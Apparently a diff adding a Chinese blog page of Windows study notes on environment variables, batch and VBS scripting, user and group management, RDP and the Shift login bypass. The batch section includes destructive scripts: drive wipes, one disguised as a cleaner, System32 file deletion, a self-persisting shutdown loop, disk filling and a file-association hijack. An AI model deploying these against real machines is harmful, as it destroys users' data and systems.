class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-显示以str开头的环境变量以及值"><a href="#2-显示以str开头的环境变量以及值" class="headerlink" title="2.显示以str开头的环境变量以及值"></a>2.显示以str开头的环境变量以及值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set pat</span><br><span class="line">Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32</span><br><span class="line">\WindowsPowerShell\v1.0\;C:\phpstudy_pro\Extensions\MySQL5.7.26\bin;</span><br><span class="line">PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-设置-修改-清空环境变量"><a href="#3-设置-修改-清空环境变量" class="headerlink" title="3.设置/修改/清空环境变量"></a>3.设置/修改/清空环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">set variable=string</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testva</span><br><span class="line">testvariable=jason</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改(直接设置就行了)</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=177</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">177</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">清空</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable=</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line"><span class="meta">%</span><span class="bash">testvariable%</span></span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;set testvariable</span><br><span class="line">环境变量 testvariable 没有定义</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-p"><a href="#4-p" class="headerlink" title="4./p"></a>4./p</h3><p>/P 命令行开关允许将变量数值设成用户输入的一行输入。读取输入行之前，显示指定的 promptString。promptString 可以是空的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717\Desktop&gt;set /p testvariable=</span><br><span class="line">jason			# 这个jason是用户自己输入的</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">jason</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果想要显示什么(promptString不为空)，则</span></span><br><span class="line">C:\Users\75717\Desktop&gt;set /p testvariable=please input the value:</span><br><span class="line">please input the value:177</span><br><span class="line"></span><br><span class="line">C:\Users\75717\Desktop&gt;echo %testvariable%</span><br><span class="line">177</span><br></pre></td></tr></table></figure>
+
+<p>/p经常放在bat脚本中，下面批处理脚本中有用到</p>
+<p><strong>值得注意的是，用set修改环境变量不是永久生效的，只对当前运行窗口有效，关闭运行窗口后，设置就不起作用了</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>步骤</th>
+<th>是否立即生效</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令行</td>
+<td>set命令</td>
+<td>否</td>
+</tr>
+<tr>
+<td>脚本</td>
+<td></td>
+<td>否</td>
+</tr>
+<tr>
+<td>修改注册表</td>
+<td>如(1)</td>
+<td>否</td>
+</tr>
+<tr>
+<td>设置系统属性</td>
+<td>系统-&gt;属性-&gt;高级-&gt;环境变量</td>
+<td>是</td>
+</tr>
+</tbody></table>
+<h1 id="bat批处理脚本"><a href="#bat批处理脚本" class="headerlink" title="bat批处理脚本"></a>bat批处理脚本</h1><p>批处理的操作就是在该账号弹出一个cmd进行自上而下的命令行操作，操作完成之后exit退出cmd</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+<p>以上就是一个恶意脚本的内容，删除e盘下的所有内容</p>
+<p>如果想要验证是否是自上而下的命令行操作，可以在中间加入操作pause，会在中途暂停，按任意键后继续</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301657657.png" alt="image-20220530165727470"></p>
+<p>如果<strong>不想要给受害者看到执行过程，只显示结果</strong>，则在第一行加入<code>@echo off</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">pause</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301700741.png" alt="image-20220530170034668"></p>
+<h2 id="清理脚本"><a href="#清理脚本" class="headerlink" title="清理脚本"></a>清理脚本</h2><p>如果制作一个清理垃圾的脚本，则可以如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">e:</span><br><span class="line">cd \</span><br><span class="line">echo 你好！准备给你清理垃圾..</span><br><span class="line">pause		</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br><span class="line">echo 你好！已经清理完毕！谢谢使用！</span><br><span class="line">pause	# 为了让用户看到这句话，需要加入pause</span><br></pre></td></tr></table></figure>
+
+<p>接下来我尝试清理在c盘下的test目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">echo ================================</span><br><span class="line">echo 欢迎使用小易清理！</span><br><span class="line">echo ================================</span><br><span class="line">c:</span><br><span class="line">cd \test</span><br><span class="line">echo 你好！准备给你清理垃圾..</span><br><span class="line">pause		</span><br><span class="line">rd . /s/q &gt;nul 2&gt;nul</span><br><span class="line">echo 你好！已经清理完毕！谢谢使用！</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301710022.png" alt="image-20220530171052957"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301710530.png" alt="image-20220530171059477"></p>
+<p>当然了可以为了显得高档一点，使用<code>color 0a</code>修改颜色</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205301713637.png" alt="image-20220530171308586"></p>
+<p>具体有什么颜色可以使用<code>color ?</code>命令查看</p>
+<p>也可以删除桌面的文件，下面是先通过通配符修改所有文件为txt后缀的文件，然后使用通配符统一删除</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">cd C:\Users\75717\Desktop</span><br><span class="line">ren *.* *.txt</span><br><span class="line">del *.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="删除系统脚本"><a href="#删除系统脚本" class="headerlink" title="删除系统脚本"></a>删除系统脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">cd c:\Windows\System32</span><br><span class="line">shutdown -r -f -t 3</span><br><span class="line">attrib -s -h *.*</span><br><span class="line">del *.* &gt;nul 2&gt;nul</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="关机脚本"><a href="#关机脚本" class="headerlink" title="关机脚本"></a>关机脚本</h2><p>如果想要用户定义关机倒计时，则可以这样写</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">echo ================================</span><br><span class="line">echo 欢迎使用小易关机！</span><br><span class="line">echo ================================</span><br><span class="line">set /p a=请输入你的时间，单位是秒：		# /p，说明后面的变量由用户设置,=号后面是提示内容</span><br><span class="line">shutdown -s -f -t %a%</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+<h2 id="无限关机脚本"><a href="#无限关机脚本" class="headerlink" title="无限关机脚本"></a>无限关机脚本</h2><p>这是一个写死的无限关机脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy shutdown.bat &quot;C:\Users\75717\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">shutdown -s -f -t 0</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里开机启动项，版本不同，位置也不同(并且需要注意操作系统的中英问题)，然后还有用户名不同</p>
+<ul>
+<li>win7/win10：C:\Users\75717\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</li>
+<li>win server 2003：C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</li>
+</ul>
+<p>而高级一点的写法，为了解决用户名不同的问题，有一个userprofile的变量，就是指向运行脚本的用户的家目录</p>
+<p>下面是win10的写法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">copy shutdown.bat &quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">shutdown -s -f -t 0</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="占用资源脚本"><a href="#占用资源脚本" class="headerlink" title="占用资源脚本"></a>占用资源脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">fsutil file createnew e:\haha.inf 30000000000	#30G的文件</span><br><span class="line">attrib +s +h e:\haha.inf 					    #隐藏该文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改关联性脚本"><a href="#修改关联性脚本" class="headerlink" title="修改关联性脚本"></a>修改关联性脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">assoc .txt=exefile &gt;nul 2&gt;nul</span><br><span class="line">echo 我赌你现在打不开记事本</span><br><span class="line">ping -n 8 127.0.0.1 &gt;nul 2&gt;nul</span><br><span class="line">echo 现在可以了</span><br><span class="line">assoc .txt=txtfile&gt;nul 	# 这里有个问题，如果txtfile后面有空格的话，这条命令会失败，不知道为什么，所以不要加空格</span><br><span class="line">pause</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="创建用户脚本"><a href="#创建用户脚本" class="headerlink" title="创建用户脚本"></a>创建用户脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set /p u=请输入您的用户名：</span><br><span class="line">set /p p=请输入您的密码：</span><br><span class="line">net user %u% %p% /add</span><br><span class="line">echo 恭喜你，账户创建成功！</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h1><p>vbs弹框</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    msgbox <span class="string">&quot;jason&quot;</span></span><br><span class="line">    msgbox <span class="string">&quot;shuai&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><h2 id="1-0-管理员运行cmd"><a href="#1-0-管理员运行cmd" class="headerlink" title="1.0 管理员运行cmd"></a>1.0 管理员运行cmd</h2><p>首先注意，win 7系统的管理员Administrator是被禁用的，不过初始创建的用户也是管理员用户(权限仅次于真正的管理员大佬Administrator)，所以一般都是用初始账号来当作管理员</p>
+<p><strong>但是win 7系统以及往后所有的windows操作系统，在使用cmd的时候，默认不是管理员运行，哪怕是已经加入了Administrator组</strong>，要右键以管理员身份运行，权限才是管理员，才能用<code>net user</code>等命令,win 2003如果本来就是管理员用户则不用右键</p>
+<hr>
+<p>默认运行cmd</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062031158.png" alt="image-20220606203157033"></p>
+<p>右键–&gt;以管理员身份运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062032788.png" alt="image-20220606203235691"></p>
+<h2 id="1-1-用户概述"><a href="#1-1-用户概述" class="headerlink" title="1.1 用户概述"></a>1.1 用户概述</h2><ul>
+<li><p>每一个用户登录系统后，拥有不同的操作权限</p>
+</li>
+<li><p>每个账户有自己唯一的SID(安全标识符)</p>
+</li>
+<li><p>不同的账户拥有不同的权限，为不同的账户赋予权限，也就是为不同账户的SID赋予权限</p>
+<p>查看SID值：whoami /user</p>
+<p>账户密码存储位置：<code>c:\windows\system32\config\SAM</code>   可以暴力破解/撞库</p>
+</li>
+<li><p>windows系统上，默认密码最长有效期42天</p>
+</li>
+</ul>
+<h2 id="1-2-内置用户"><a href="#1-2-内置用户" class="headerlink" title="1.2 内置用户"></a>1.2 内置用户</h2><ul>
+<li><p>给人使用的账户：</p>
+<p>administrator    #管理员账户，95%权限</p>
+<p>guest                   #来宾账户，20%权限，一般公用电脑用该身份</p>
+</li>
+<li><p>计算及服务组件相关的系统账号</p>
+<p>system                #系统账户 == 权限至高无上，100%权限</p>
+<p>local services      #本地服务账户 == 权限等于普通用户，50%权限</p>
+<p>network services#网络服务账户 == 权限等于普通用户，50%权限</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011542976.png" alt="image-20220601154222824"></p>
+<p>可以看到用户名的列有系统自己的账号和给人使用的账号打开的进程，系统进程是系统自己的用户打开的，不可轻易删除</p>
+<p>这五个用户都是内置用户，不用创建，系统会自己创建。内置账号是无法删除的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011548321.png" alt="image-20220601154855212"></p>
+<p>每个用户都有自己的私人物品，和linux的文件夹权限一样，除非是管理员</p>
+<p>比如说不同账号的桌面是不一样的，因为桌面就是属于自己的私人物品(属主是自己，桌面的路径在自己家目录下)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011557754.png" alt="image-20220601155706696"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011557147.png" alt="image-20220601155744088"></p>
+<p>这是两个不同账号的桌面，内容是不一样的，因为jason是管理员账号，可以打开75717的桌面</p>
+<p>而如果是普通用户，打开管理员的文件需要管理员的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011607104.png" alt="image-20220601160733040"></p>
+<p>而普通用户如果在windows server这种用来搭建服务器的操作系统，是没有权限关机的</p>
+<h2 id="1-3-配置文件"><a href="#1-3-配置文件" class="headerlink" title="1.3 配置文件"></a>1.3 配置文件</h2><p>每个用户都有自己的配置文件（就是linux中的home家目录)，<strong>在用户第一次登录时自动产生</strong>，路径是:</p>
+<p>win7/win10/win2008：c:\用户\</p>
+<p>xp/win2003：                 c:\Documents and Settings\</p>
+<h2 id="1-4-用户管理命令"><a href="#1-4-用户管理命令" class="headerlink" title="1.4 用户管理命令"></a>1.4 用户管理命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user  				#查看用户列表</span><br><span class="line">net user 用户名 新密码	#改密码</span><br><span class="line">net user 用户名 密码 /add #创建一个新用户</span><br><span class="line">net user 用户名 /del	  #删除一个用户</span><br><span class="line">net user 用户名 /active:yes/active:no	#激活/禁用账户</span><br></pre></td></tr></table></figure>
+
+<p>注意，修改密码或者创建、删除、激活、禁用的话，必须要以管理员身份运行cmd，否则</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011930905.png" alt="image-20220601193022773"></p>
+<p>所以一定要以管理员身份运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011931977.png" alt="image-20220601193101906"></p>
+<p>接下来就会提示需要管理员密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011931780.png" alt="image-20220601193145704"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206011933068.png" alt="image-20220601193304004"></p>
+<h2 id="1-5-远程桌面连接-RDP"><a href="#1-5-远程桌面连接-RDP" class="headerlink" title="1.5 远程桌面连接(RDP)"></a>1.5 远程桌面连接(RDP)</h2><p>端口号3389</p>
+<p>如果想要远程连接windows，下面举个例子讲解</p>
+<ul>
+<li>首先需要关闭主机和服务器机的防火墙</li>
+<li>确保两台机器可以互通</li>
+<li>被连接的服务器打开远程连接功能(可以<code>netstat -an</code>查看3389是否开启)</li>
+</ul>
+<p>win7系统的话这样打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010150270.png" alt="image-20220601015047179"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010203859.png" alt="image-20220601020315800"></p>
+<p>框里这两个选项都可以</p>
+<p>win10系统的话，控制面板–&gt;系统–&gt;远程桌面–&gt;启用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010215294.png" alt="image-20220601021539124"></p>
+<hr>
+<ul>
+<li>得知客户机的用户名与密码</li>
+</ul>
+<p>在win7中右击计算机–&gt;管理–&gt;本地用户和组–&gt;用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010218891.png" alt="image-20220601021826833"></p>
+<p>可以看到每个用户的图标不一样，第二个和第三个(Administrator和Guest)的图标有↓的箭头，说明已经被禁用了</p>
+<p>如果想要远程连接win7，就需要知道名称(不是全名)，然后还有密码，密码可以从下图中创建或者更新</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010220271.png" alt="image-20220601022025212"></p>
+<hr>
+<ul>
+<li>获取win7的计算机名称</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\75717&gt;whoami</span><br><span class="line">win-qbf046b1789\75717</span><br><span class="line"></span><br><span class="line">C:\Users\75717&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>win-qbf046b1789</code>就是该计算机的名称</p>
+<ul>
+<li>win10中打开mstsc远程连接</li>
+</ul>
+<p>win+R打开运行，然后输入mstsc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010221429.png" alt="image-20220601022116378"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010223099.png" alt="image-20220601022344032"></p>
+<p>点击连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010224236.png" alt="image-20220601022401159"></p>
+<p>这时候输入jason用户的密码就可以连接上去了，如果用户名不对，点击更多选项就可以修改，点击连接后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010224944.png" alt="image-20220601022456886"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010225895.png" alt="image-20220601022519804"></p>
+<p>因为我的虚拟机中已经登录了75717的账户，所以要退出虚拟机中的账户，切换到虚拟机会有提示，点击注销后就可以连接到win7了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206010226791.png" alt="image-20220601022638598"></p>
+<p>注意，如果使用非管理员账户登录远程，需要在服务器上将用户加入到远程桌面内置组Remote Desktop Users中，而且所有远程连接都不可以关机！只能注销和断开连接！</p>
+<p>如果不加入内置组的话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051914813.png" alt="image-20220605191423739"></p>
+<p>添加到内置组的图形办法如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051911253.png" alt="image-20220605191123089"></p>
+<p>而命令行的办法，可以先查看一下<code>Remote Desktop Users</code>组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051919137.png" alt="image-20220605191913055"></p>
+<p>可以看到bob是之前在图形界面中添加的，所以如果想要用普通用户远程连接，也可以用命令行把普通用户加入到<code>Remote Desktop Users</code>组就可以了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; 177 /add		#把普通用户177加入内置组中，记得加双引号，因为中间有空格</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h1><h2 id="2-1组概述"><a href="#2-1组概述" class="headerlink" title="2.1组概述"></a>2.1组概述</h2><p>组的作用：简化权限的赋予。</p>
+<p>赋予权限的方式：</p>
+<ol>
+<li>用户—组—赋予权限</li>
+<li>用户—赋予权限</li>
+</ol>
+<h2 id="2-2内置组"><a href="#2-2内置组" class="headerlink" title="2.2内置组"></a>2.2内置组</h2><p>内置组的权限默认已经被系统赋予。administrator是管理员是因为它属于administrator组的，并不是因为名字是administrator</p>
+<p><strong>所以如果想要让一个用户提权为管理员，只需要把它放进administrator组就可以了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1)administrator		#管理员组</span><br><span class="line">2)guests			#来宾组</span><br><span class="line">3)users				#普通用户组，默认新建用户都属于该组</span><br><span class="line">4)network			#网络配置组</span><br><span class="line">5)print				#打印机组</span><br><span class="line">6)Remote Desktop	#远程桌面组</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021821437.png" alt="image-20220602182132298"></p>
+<p>如果想要查看组里面都有谁，比如双击administrator组，可以看到当前的管理员用户有哪些</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021822218.png" alt="image-20220602182202034"></p>
+<p>如果想要查看某个用户存在的组，比如在用户中双击bob用户，就可以看到该用户隶属于哪个组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206021824097.png" alt="image-20220602182425966"></p>
+<p>如果服务器老板想要让bob用户管理网络配置这一块，但是又不想让它能得到管理员权限，就把bob分配到network网络配置组，这样的话bob就有user组和network组的权限，两者是叠加的。</p>
+<h2 id="2-3创建组-加入用户"><a href="#2-3创建组-加入用户" class="headerlink" title="2.3创建组/加入用户"></a>2.3创建组/加入用户</h2><h3 id="图形化添加"><a href="#图形化添加" class="headerlink" title="图形化添加"></a>图形化添加</h3><p>右键计算机–&gt;管理–&gt;本地用户和组–&gt;组–&gt;右键新建组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030201610.png" alt="image-20220603020145475"></p>
+<p>组命名为：jason177，把177用户放进该组里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030203433.png" alt="image-20220603020317333"></p>
+<p>再去到用户那里，右键177–&gt;属性,可以看到177用户隶属于那些组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030204644.png" alt="image-20220603020412546"></p>
+<h3 id="命令行添加"><a href="#命令行添加" class="headerlink" title="命令行添加"></a>命令行添加</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net localgroup					#列出所有的组</span><br><span class="line">net localgroup 组名 /add	       #添加组</span><br><span class="line">net localgroup 组名			   #查看成员</span><br><span class="line">net localgroup 组名 用户名 /add   #把用户添加到组里</span><br><span class="line">net localgroup 组名 用户名 /del   #把用户从组里移除</span><br><span class="line">net localgroup 组名 /del         #把组删除</span><br></pre></td></tr></table></figure>
+
+<p>这里创建一个组为bobgroup，然后把bob用户添加进来(<strong>注意，这里一定要以管理员运行cmd</strong>)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建组</span></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup /add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup</span><br><span class="line"></span><br><span class="line">\\WIN-QBF046B1789 的别名</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line">*Administrators</span><br><span class="line">*Backup Operators</span><br><span class="line">*bobgroup</span><br><span class="line">...</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">添加用户到组里</span></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup bob /add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup bobgroup</span><br><span class="line">别名     bobgroup</span><br><span class="line">注释</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line">bob</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：用户千万不能移除出原来的users组，哪怕是加入了administrator组，也不能从users组中移除，否则会登录不了该操作系统，用户的本职组必须要保留。</strong></p>
+<h3 id="赋予权限"><a href="#赋予权限" class="headerlink" title="赋予权限"></a>赋予权限</h3><p>赋予权限的话就是在某个文件夹或者磁盘或者文件，右键属性–&gt;安全，就可以把权限给到任意组</p>
+<h1 id="Shift漏洞"><a href="#Shift漏洞" class="headerlink" title="Shift漏洞"></a>Shift漏洞</h1><p>这里注意在win7和win10没有进入系统时,可以通过系统修复<em>漏洞</em>篡改文件名进入系统。(若已修补漏洞则无法利用)</p>
